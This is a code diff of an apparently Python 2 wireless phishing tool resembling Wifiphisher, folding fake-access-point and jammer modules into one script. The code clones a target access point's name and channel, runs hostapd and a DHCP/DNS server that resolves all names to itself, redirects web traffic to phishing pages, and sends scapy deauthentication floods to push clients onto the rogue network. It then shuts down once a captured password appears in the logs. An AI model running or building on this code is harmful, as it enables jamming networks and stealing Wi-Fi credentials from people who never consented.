@@ -13,16 +13,18 @@ import httplib
 import SocketServer
 import cgi
 import string
-import lib.fakeAP as fap
-import lib.wifijammer as wj
-from threading import Thread
+import argparse
+import fcntl
+#import lib.fakeAP as fap
+#import lib.wifijammer as wj
+from threading import Thread, Lock
 from subprocess import Popen, PIPE, check_output
 from scapy.all import *
 conf.verb = 0
 
 # Basic configuration
-PORT = 8085
-SSL_PORT = 445
+PORT = 8081
+SSL_PORT = 444
 PEM = 'cert/server.pem'
 CONFIG = "config/config.ini"
 PHISING_PAGES = "access-point-pages"
@@ -39,6 +41,25 @@ C = '\033[36m'   # cyan
 GR = '\033[37m'  # gray
 T = '\033[93m'   # tan
 
+count = 0 # for channel hopping Thread
+APs = {} # for listing APs
+hop_daemon_running = True 
+
+def parse_args():
+    #Create the arguments
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-c", "--channel", help="Choose the channel for monitoring. Default is channel 1", default="1")
+    parser.add_argument("-s", "--skip", help="Skip deauthing this MAC address. Example: -s 00:11:BB:33:44:AA")
+    parser.add_argument("-ji", "--jamminginterface", help="Choose monitor mode interface. By default script will find the most powerful interface and starts monitor mode on it. Example: -i mon5")
+    parser.add_argument("-ai", "--apinterface", help="Choose monitor mode interface. By default script will find the most powerful interface and starts monitor mode on it. Example: -i mon5")
+    parser.add_argument("-m", "--maximum", help="Choose the maximum number of clients to deauth. List of clients will be emptied and repopulated after hitting the limit. Example: -m 5")
+    parser.add_argument("-n", "--noupdate", help="Do not clear the deauth list when the maximum (-m) number of client/AP combos is reached. Must be used in conjunction with -m. Example: -m 10 -n", action='store_true')
+    parser.add_argument("-t", "--timeinterval", help="Choose the time interval between packets being sent. Default is as fast as possible. If you see scapy errors like 'no buffer space' try: -t .00001")
+    parser.add_argument("-p", "--packets", help="Choose the number of packets to send in each deauth burst. Default value is 1; 1 packet to the client and 1 packet to the AP. Send 2 deauth packets to the client and 2 deauth packets to the AP: -p 2")
+    parser.add_argument("-d", "--directedonly", help="Skip the deauthentication packets to the broadcast address of the access points and only send them to client/AP pairs", action='store_true')
+    parser.add_argument("-a", "--accesspoint", help="Enter the MAC address of a specific access point to target")
+
+    return parser.parse_args()
 
 class SecureHTTPServer(BaseHTTPServer.HTTPServer):
     """
@@ -196,7 +217,6 @@ def stop_server(port=PORT, ssl_port=SSL_PORT):
     conn.request("QUIT", "/")
     conn.getresponse()
 
-
 def config_section_map(section):
     """
     Maps the values of a config file to a dictionary.
@@ -213,41 +233,465 @@ def config_section_map(section):
             dict1[option] = None
     return dict1
 
-
-def sniff_dot11(mon_iface):
-    """
-    Taken from wifijammer. We need this here to run it from a thread.
-    """
-    try:
-        sniff(iface=mon_iface, store=0, prn=wj.cb)
-    except Exception:
-        pass
-
-
 def shutdown():
     """
     Shutdowns program.
     """
     stop_server()
-    with open('/proc/sys/net/ipv4/ip_forward', 'r+') as forward:
-        forward.write(fap.forw)
     os.system('iptables -F')
     os.system('iptables -X')
     os.system('iptables -t nat -F')
     os.system('iptables -t nat -X')
     os.system('pkill airbase-ng')
-    os.system('pkill dhcpd')
+    os.system('pkill dnsmasq')
+    os.system('pkill hostapd')
     if os.path.isfile('/tmp/wifiphisher-webserver.tmp'):
         os.remove('/tmp/wifiphisher-webserver.tmp')
     if os.path.isfile('/tmp/wifiphisher-jammer.tmp'):
         os.remove('/tmp/wifiphisher-jammer.tmp')
-    fap.rm_mon()
-    if not wj.monitor_on:
-        wj.remove_mon_iface(mon_iface)
+    if os.path.isfile('/tmp/hostapd.conf'):
+        os.remove('/tmp/hostapd.conf')
+    reset_interfaces()
     print '\n[' + R + '!' + W + '] Closing'
     sys.exit(0)
 
+def get_interfaces():
+    interfaces = {"monitor": [], "managed": [], "all": []}
+    proc = Popen(['iwconfig'], stdout=PIPE, stderr=DN)
+    for line in proc.communicate()[0].split('\n'):
+        if len(line) == 0: continue # Isn't an empty string
+        if line[0] != ' ': # Doesn't start with space
+            wired_search = re.search('eth[0-9]|em[0-9]|p[1-9]p[1-9]', line)
+            if not wired_search: # Isn't wired
+                iface = line[:line.find(' ')] # is the interface
+                if 'Mode:Monitor' in line:
+                    interfaces["monitor"].append(iface)
+                elif 'IEEE 802.11' in line:
+                    interfaces["managed"].append(iface)
+                interfaces["all"].append(iface)
+    return interfaces
+
+def get_iface(mode="all", exceptions=["_wifi"]):
+    ifaces = get_interfaces()[mode]
+    for i in ifaces:
+        if i not in exceptions:
+            return i
+    return False
+
+def reset_interfaces():
+    monitors = get_interfaces()["monitor"]
+    for m in monitors:
+        if 'mon' in m:
+            Popen(['airmon-ng', 'stop', m], stdout=DN, stderr=DN)
+        else:
+            Popen(['ifconfig', m, 'down'], stdout=DN, stderr=DN)
+            Popen(['iwconfig', m, 'mode', 'managed'], stdout=DN, stderr=DN)
+            Popen(['ifconfig', m, 'up'], stdout=DN, stderr=DN)
+
+def get_internet_interface():
+    '''return the wifi internet connected iface'''
+    inet_iface = None
+    proc = Popen(['/sbin/ip', 'route'], stdout=PIPE, stderr=DN)
+    def_route = proc.communicate()[0].split('\n')#[0].split()
+    for line in def_route:
+        if 'wlan' in line and 'default via' in line:
+            line = line.split()
+            inet_iface = line[4]
+            ipprefix = line[2][:2] # Just checking if it's 192, 172, or 10
+            return inet_iface
+    return False
+
+def get_internet_ip_prefix():
+    '''return the wifi internet connected IP prefix'''
+    ipprefix = None
+    proc = Popen(['/sbin/ip', 'route'], stdout=PIPE, stderr=DN)
+    def_route = proc.communicate()[0].split('\n')#[0].split()
+    for line in def_route:
+        if 'wlan' in line and 'default via' in line:
+            line = line.split()
+            inet_iface = line[4]
+            ipprefix = line[2][:2] # Just checking if it's 192, 172, or 10
+            return ipprefix
+    return False
+
+def channel_hop(mon_iface):
+    chan = 0
+    err = None
+    while hop_daemon_running:
+        try:
+            err = None
+            if chan > 11:
+                chan = 0
+            chan = chan+1
+            channel = str(chan)
+            iw = Popen(['iw', 'dev', mon_iface, 'set', 'channel', channel], stdout=DN, stderr=PIPE)
+            for line in iw.communicate()[1].split('\n'):
+                if len(line) > 2: # iw dev shouldnt display output unless there's an error
+                    with lock:
+                        err = '['+R+'-'+W+'] Channel hopping failed: '+R+line+W+'\n    \
+Try disconnecting the monitor mode\'s parent interface (e.g. wlan0)\n    \
+from the network if you have not already\n'
+                    break
+            time.sleep(1)
+        except KeyboardInterrupt:
+            sys.exit()
+
+def sniffing(interface, cb):
+    '''This exists for if/when I get deauth working
+    so that it's easy to call sniff() in a thread'''
+    sniff(iface=interface, prn=cb, store=0)
+
+def targeting_cb(pkt):
+    global APs, count
+    if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
+        try:
+            ap_channel = str(ord(pkt[Dot11Elt:3].info))
+        except Exception:
+            return
+        essid = pkt[Dot11Elt].info
+        mac = pkt[Dot11].addr2
+        if len(APs) > 0:
+            for num in APs:
+                if essid in APs[num][1]:
+                    return
+        count += 1
+        APs[count] = [ap_channel, essid, mac]
+        target_APs()
+
+def target_APs():
+    global APs, count
+    os.system('clear')
+    print '['+G+'+'+W+'] Ctrl-C at any time to copy an access point from below'
+    print 'num  ch   ESSID'
+    print '---------------'
+    for ap in APs:
+        print G+str(ap).ljust(2)+W+' - '+APs[ap][0].ljust(2)+' - '+T+APs[ap][1]+W
+
+def copy_AP():
+    global APs, count
+    copy = None
+    while not copy:
+        try:
+            copy = raw_input('\n['+G+'+'+W+'] Choose the ['+G+'num'+W+'] of the AP you wish to copy: ')
+            copy = int(copy)
+        except Exception:
+            copy = None
+            continue
+    channel = APs[copy][0]
+    essid = APs[copy][1]
+    if str(essid) == "\x00":
+        essid = ' '
+    mac = APs[copy][2]
+    return channel, essid, mac
+
+def start_ap(mon_iface, channel, essid, args):
+    print '['+T+'*'+W+'] Starting the fake access point...'
+    config = ('interface=%s\n'
+              'driver=nl80211\n'
+              'ssid=%s\n'
+              'hw_mode=g\n'
+              'channel=%s\n'
+              'macaddr_acl=0\n'
+              'ignore_broadcast_ssid=0\n'
+             )
+    with open('/tmp/hostapd.conf', 'w') as dhcpconf:
+            dhcpconf.write(config % (mon_iface, essid, channel))
+
+    Popen(['hostapd', '/tmp/hostapd.conf'], stdout=DN, stderr=DN)
+    try:
+        time.sleep(6) # Copied from Pwnstar which said it was necessary?
+    except KeyboardInterrupt:
+        cleanup(None, None)
+    Popen(['ifconfig', mon_iface, 'up', '10.0.0.1', 'netmask', '255.255.255.0'], stdout=DN, stderr=DN)
+    Popen(['ifconfig', mon_iface, 'mtu', '1400'], stdout=DN, stderr=DN)
+
+def dhcp_conf(interface):
+    
+    config = ( # disables dnsmasq reading any other files like /etc/resolv.conf for nameservers
+              'no-resolv\n'
+              # Interface to bind to
+              'interface=%s\n'
+              # Specify starting_range,end_range,lease_time
+              'dhcp-range=%s\n'
+              'address=/#/10.0.0.1'
+             )
+
+    ipprefix = get_internet_ip_prefix()
+    if ipprefix == '19' or ipprefix == '17' or not ipprefix:
+        with open('/tmp/dhcpd.conf', 'w') as dhcpconf:
+            # subnet, range, router, dns
+            dhcpconf.write(config % (interface, '10.0.0.2,10.0.0.100,12h'))
+    elif ipprefix == '10':
+        with open('/tmp/dhcpd.conf', 'w') as dhcpconf:
+            dhcpconf.write(config % (interface, '172.16.0.2,172.16.0.100,12h'))
+    return '/tmp/dhcpd.conf'
+
+def dhcp(dhcpconf):
+    os.system('echo > /var/lib/misc/dnsmasq.leases')
+    dhcp = Popen(['dnsmasq', '-C', dhcpconf], stdout=PIPE, stderr=DN)
+    ipprefix = get_internet_ip_prefix()
+    if ipprefix == '19' or ipprefix == '17' or not ipprefix:
+        os.system('route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1')
+    else:
+        os.system('route add -net 172.16.0.0 netmask 255.255.255.0 gw 172.16.0.1')
+
+def get_strongest_iface(exceptions=[]):
+    interfaces = get_interfaces()["managed"]
+    scanned_aps = []
+    for i in interfaces:
+        if i in exceptions:
+            continue        
+        count = 0
+        proc = Popen(['iwlist', i, 'scan'], stdout=PIPE, stderr=DN)
+        for line in proc.communicate()[0].split('\n'):
+            if ' - Address:' in line: # first line in iwlist scan for a new AP
+               count += 1
+        scanned_aps.append((count, i))
+        print '['+G+'+'+W+'] Networks discovered by '+G+i+W+': '+T+str(count)+W
+    if len(scanned_aps) > 0:
+        interface = max(scanned_aps)[1]
+        return interface
+    return False
+
+def start_mon_mode(interface):
+    print '['+G+'+'+W+'] Starting monitor mode off '+G+interface+W
+    try:
+        os.system('ifconfig %s down' % interface)
+        os.system('iwconfig %s mode monitor' % interface)
+        os.system('ifconfig %s up' % interface)
+        return interface
+    except Exception:
+        sys.exit('['+R+'-'+W+'] Could not start monitor mode')
+
+# Wifi Jammer stuff
+
+def channel_hop2(mon_iface):
+    '''
+    First time it runs through the channels it stays on each channel for 5 seconds
+    in order to populate the deauth list nicely. After that it goes as fast as it can
+    '''
+    global monchannel, first_pass
+
+    channelNum = 0
+    err = None
+
+    while 1:
+        if args.channel:
+            with lock:
+                monchannel = args.channel
+        else:
+            channelNum +=1
+            if channelNum > 11:
+                channelNum = 1
+                with lock:
+                    first_pass = 0
+            with lock:
+                monchannel = str(channelNum)
+
+            proc = Popen(['iw', 'dev', mon_iface, 'set', 'channel', monchannel], stdout=DN, stderr=PIPE)
+            for line in proc.communicate()[1].split('\n'):
+                if len(line) > 2: # iw dev shouldnt display output unless there's an error
+                    err = '['+R+'-'+W+'] Channel hopping failed: '+R+line+W
+
+        output(monchannel)
+        if args.channel:
+            time.sleep(.05)
+        else:
+            # For the first channel hop thru, do not deauth
+            if first_pass == 1:
+                time.sleep(1)
+                continue
+
+        deauth(monchannel)
+
+def deauth(monchannel):
+    '''
+    addr1=destination, addr2=source, addr3=bssid, addr4=bssid of gateway if there's
+    multi-APs to one gateway. Constantly scans the clients_APs list and
+    starts a thread to deauth each instance
+    '''
+
+    pkts = []
+
+    if len(clients_APs) > 0:
+        with lock:
+            for x in clients_APs:
+                client = x[0]
+                ap = x[1]
+                ch = x[2]
+                # Can't add a RadioTap() layer as the first layer or it's a malformed
+                # Association request packet?
+                # Append the packets to a new list so we don't have to hog the lock
+                # type=0, subtype=12?
+                if ch == monchannel:
+                    deauth_pkt1 = Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Deauth()
+                    deauth_pkt2 = Dot11(addr1=ap, addr2=client, addr3=client)/Dot11Deauth()
+                    pkts.append(deauth_pkt1)
+                    pkts.append(deauth_pkt2)
+    if len(APs) > 0:
+        if not args.directedonly:
+            with lock:
+                for a in APs:
+                    ap = a[0]
+                    ch = a[1]
+                    if ch == monchannel:
+                        deauth_ap = Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=ap, addr3=ap)/Dot11Deauth()
+                        pkts.append(deauth_ap)
+
+    if len(pkts) > 0:
+        # prevent 'no buffer space' scapy error http://goo.gl/6YuJbI
+        if not args.timeinterval:
+            args.timeinterval = 0
+        if not args.packets:
+            args.packets = 1
+
+        for p in pkts:
+            send(p, inter=float(args.timeinterval), count=int(args.packets))
+
+def output(monchannel):
+    with open("/tmp/wifiphisher-jammer.tmp", "a+") as log_file:
+        log_file.truncate()
+        with lock:
+            for ca in clients_APs:
+                if len(ca) > 3:
+                    log_file.write('['+T+'*'+W+'] '+O+ca[0]+W+' - '+O+ca[1]+W+' - '+ca[2].ljust(2)+' - '+T+ca[3]+W + '\n')
+                else: 
+                    log_file.write('['+T+'*'+W+'] '+O+ca[0]+W+' - '+O+ca[1]+W+' - '+ca[2])
+        with lock:
+            for ap in APs:
+                log_file.write('['+T+'*'+W+'] '+O+ap[0]+W+' - '+ap[1].ljust(2)+' - '+T+ap[2]+W + '\n')
+        #print ''
+
+def noise_filter(skip, addr1, addr2):
+    # Broadcast, broadcast, IPv6mcast, spanning tree, spanning tree, multicast, broadcast
+    ignore = ['ff:ff:ff:ff:ff:ff', '00:00:00:00:00:00', '33:33:00:', '33:33:ff:', '01:80:c2:00:00:00', '01:00:5e:', mon_MAC]
+    if skip:
+        ignore.append(skip)
+    for i in ignore:
+        if i in addr1 or i in addr2:
+            return True
+
+def cb(pkt):
+    '''
+    Look for dot11 packets that aren't to or from broadcast address,
+    are type 1 or 2 (control, data), and append the addr1 and addr2
+    to the list of deauth targets.
+    '''
+    global clients_APs, APs
+
+    # return these if's keeping clients_APs the same or just reset clients_APs?
+    # I like the idea of the tool repopulating the variable more
+    if args.maximum:
+        if args.noupdate:
+            if len(clients_APs) > int(args.maximum):
+                return
+        else:
+            if len(clients_APs) > int(args.maximum):
+                with lock:
+                    clients_APs = []
+                    APs = []
+
+    # We're adding the AP and channel to the deauth list at time of creation rather
+    # than updating on the fly in order to avoid costly for loops that require a lock
+    if pkt.haslayer(Dot11):
+        if pkt.addr1 and pkt.addr2:
+
+            # Filter out all other APs and clients if asked
+            if args.accesspoint:
+                if args.accesspoint not in [pkt.addr1, pkt.addr2]:
+                    return
+
+            # Check if it's added to our AP list
+            if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
+                APs_add(clients_APs, APs, pkt, args.channel)
+
+            # Ignore all the noisy packets like spanning tree
+            if noise_filter(args.skip, pkt.addr1, pkt.addr2):
+                return
+
+            # Management = 1, data = 2
+            if pkt.type in [1, 2]:
+                clients_APs_add(clients_APs, pkt.addr1, pkt.addr2)
+
+def APs_add(clients_APs, APs, pkt, chan_arg):
+    ssid       = pkt[Dot11Elt].info
+    bssid      = pkt[Dot11].addr3
+    try:
+        # Thanks to airoscapy for below
+        ap_channel = str(ord(pkt[Dot11Elt:3].info))
+        # Prevent 5GHz APs from being thrown into the mix
+        chans = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11']
+        if ap_channel not in chans:
+            return
+
+        if chan_arg:
+            if ap_channel != chan_arg:
+                return
+
+    except Exception as e:
+        return
+
+    if len(APs) == 0:
+        with lock:
+            return APs.append([bssid, ap_channel, ssid])
+    else:
+        for b in APs:
+            if bssid in b[0]:
+                return
+        with lock:
+            return APs.append([bssid, ap_channel, ssid])
+
+def clients_APs_add(clients_APs, addr1, addr2):
+
+    if len(clients_APs) == 0:
+        if len(APs) == 0:
+            with lock:
+                return clients_APs.append([addr1, addr2, monchannel])
+        else:
+            AP_check(addr1, addr2)
+
+    # Append new clients/APs if they're not in the list
+    else:
+        for ca in clients_APs:
+            if addr1 in ca and addr2 in ca:
+                return
+
+        if len(APs) > 0:
+            return AP_check(addr1, addr2)
+        else:
+            with lock:
+                return clients_APs.append([addr1, addr2, monchannel])
+
+def AP_check(addr1, addr2):
+    for ap in APs:
+        if ap[0].lower() in addr1.lower() or ap[0].lower() in addr2.lower():
+            with lock:
+                return clients_APs.append([addr1, addr2, ap[1], ap[2]])
+
+
+def mon_mac(mon_iface):
+    '''
+    http://stackoverflow.com/questions/159137/getting-mac-address
+    '''
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', mon_iface[:15]))
+    mac = ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]
+    print '['+G+'*'+W+'] Monitor mode: '+G+mon_iface+W+' - '+O+mac+W
+    return mac
+
+def sniff_dot11(mon_iface):
+    """
+    We need this here to run it from a thread.
+    """
+    sniff(iface=mon_iface, store=0, prn=cb)
+
 if __name__ == "__main__":
+
+    # Are you root?
+    if os.geteuid():
+        sys.exit('[' + R + '-' + W + '] Please run as root')
+    # Parse args
+    args = parse_args()
 
     # Start HTTP server in a background thread
     Handler = HTTPRequestHandler
@@ -265,33 +709,32 @@ if __name__ == "__main__":
     secure_webserver.daemon = True
     secure_webserver.start()
 
-    # Are you root?
-    if os.geteuid():
-        sys.exit('[' + R + '-' + W + '] Please run as root')
-
-    # Get isc dhcp server if needed
-    fap.get_isc_dhcp_server()
-
-    # Parse fap args
-    fap.args = fap.parse_args()
-    global ipf, mon_iface, ap_mac
-    channel = '1'
-    if fap.args.channel:
-        channel = fap.args.channel
-    essid = 'Free Wifi'
-    if fap.args.essid:
-        essid = fap.args.essid
-
     # Get interfaces
-    monitors, interfaces = fap.iwconfig()
-    fap.rm_mon()
-    inet_iface, ipprefix = fap.internet_info(interfaces)
-    wj_iface = wj.get_mon_iface(wj.parse_args(), inet_iface)
-    ap_iface = fap.AP_iface(interfaces, inet_iface, wj_iface)
-    if not ap_iface:
-        sys.exit('[' + R + '-' + W + '] Found internet connected interface in ' + T + inet_iface + W + '. \
-        Please bring up a wireless interface to use as the fake access point.')
-    ipf = fap.iptables(inet_iface)
+    reset_interfaces()
+    if not args.jamminginterface:
+        inet_iface = get_internet_interface() 
+        mon_iface = get_iface(mode="monitor", exceptions=[inet_iface])
+        iface_to_monitor = False
+    else:
+        mon_iface = False
+        iface_to_monitor = args.jamminginterface
+    if not mon_iface:
+        if args.jamminginterface:
+            iface_to_monitor = args.jamminginterface
+        else:
+            iface_to_monitor = get_strongest_iface()
+        if not iface_to_monitor and not inet_iface:
+            sys.exit('['+R+'-'+W+'] No wireless interfaces found, bring one up and try again')
+        mon_iface = start_mon_mode(iface_to_monitor)
+    wj_iface = mon_iface
+    if not args.apinterface:
+        ap_iface = get_iface(mode="managed", exceptions=[iface_to_monitor])
+    else:
+        ap_iface = args.apinterface
+
+    # WE GOT THE INTERFACES CORRECTLY AT THIS POINT
+    print "Monitor is: " + mon_iface 
+    print "For the AP is: " + ap_iface
 
     # Set iptable rules and kernel variables.
     os.system('iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:%s' % PORT)
@@ -299,48 +742,49 @@ if __name__ == "__main__":
     Popen(['sysctl', '-w', 'net.ipv4.conf.all.route_localnet=1'], stdout=DN, stderr=PIPE)
 
     print '[' + T + '*' + W + '] Cleared leases, started DHCP, set up iptables'
-    mon_iface = fap.start_monitor(ap_iface, channel)
-    mon_mac = fap.get_mon_mac(mon_iface)
 
     # Copy AP
     time.sleep(3)
-    hop = fap.Thread(target=fap.channel_hop, args=(mon_iface,))
+    hop = Thread(target=channel_hop, args=(mon_iface,))
     hop.daemon = True
     hop.start()
-    fap.sniffing(mon_iface, fap.targeting_cb)
-    channel, essid, ap_mac = fap.copy_AP()
+    sniffing(mon_iface, targeting_cb)
+    channel, essid, ap_mac = copy_AP()
+    hop_daemon_running = False
 
     # Start AP
-    fap.start_ap(mon_iface, channel, essid, fap.args)
-    dhcpconf = fap.dhcp_conf(ipprefix)
-    fap.dhcp(dhcpconf, ipprefix)
+    start_ap(ap_iface, channel, essid, args)
+    dhcpconf = dhcp_conf(ap_iface)
+    dhcp(dhcpconf)
     os.system('clear')
     print '[' + T + '*' + W + '] ' + T + \
           essid + W + ' set up on channel ' + \
           T + channel + W + ' via ' + T + mon_iface \
           + W + ' on ' + T + ap_iface + W
 
-    # wifijammer initialization
-    wj.clients_APs = []
-    wj.APs = []
-    wj.DN = open(os.devnull, 'w')
-    wj.lock = wj.Lock()
-    wj.args = wj.parse_args()
-    wj.args.accesspoint = ap_mac
-    wj.args.channel = channel
-    wj.monitor_on = None
-    wj.conf.iface = wj_iface
-    wj.mon_MAC = wj.mon_mac(wj_iface)
-    wj.first_pass = 1
 
+    clients_APs = []
+    APs = []
+    DN = open(os.devnull, 'w')
+    lock = Lock()
+    args = parse_args()
+    args.accesspoint = ap_mac
+    args.channel = channel
+    monitor_on = None
+    conf.iface = mon_iface
+    mon_MAC = mon_mac(mon_iface)
+    first_pass = 1
+
+    monchannel = channel
     # Start channel hopping
-    wj.hop = wj.Thread(target=wj.channel_hop, args=(wj_iface, wj.args))
-    wj.hop.daemon = True
-    wj.hop.start()
+    hop = Thread(target=channel_hop2, args=(wj_iface,))
+    hop.daemon = True
+    hop.start()
 
-    wj.sniff = wj.Thread(target=sniff_dot11, args=(wj_iface,))
-    wj.sniff.daemon = True
-    wj.sniff.start()
+    # Start sniffing
+    sniff_thread = Thread(target=sniff_dot11, args=(wj_iface,))
+    sniff_thread.daemon = True
+    sniff_thread.start()
 
     # Main loop.
     try:
@@ -356,11 +800,14 @@ if __name__ == "__main__":
             for l in lines:
                 print l
             print "DHCP Leases: "
-            proc = check_output(['cat', '/var/lib/dhcp/dhcpd.leases'])
-            matches = re.findall("\n  (client-hostname .*);\n", proc)
-            matches += ["\n"] * (5 - len(matches))
-            for m in matches:
-                print m
+            if os.path.isfile('/var/lib/misc/dnsmasq.leases'):
+                proc = check_output(['cat', '/var/lib/misc/dnsmasq.leases'])
+                lines = proc.split('\n')
+                lines += ["\n"] * (5 - len(lines))
+            else:
+                lines = ["\n"] * 5
+            for l in lines:
+                print l
             print "HTTP requests: "
             if os.path.isfile('/tmp/wifiphisher-webserver.tmp'):
                 proc = check_output(['tail', '-5', '/tmp/wifiphisher-webserver.tmp'])
@@ -372,7 +819,8 @@ if __name__ == "__main__":
                 print l
                 # We got a victim. Shutdown everything.
                 if "password" in l:
+                    time.sleep(1)
                     shutdown()
-            time.sleep(1)
+            time.sleep(0.5)
     except KeyboardInterrupt:
         shutdown()
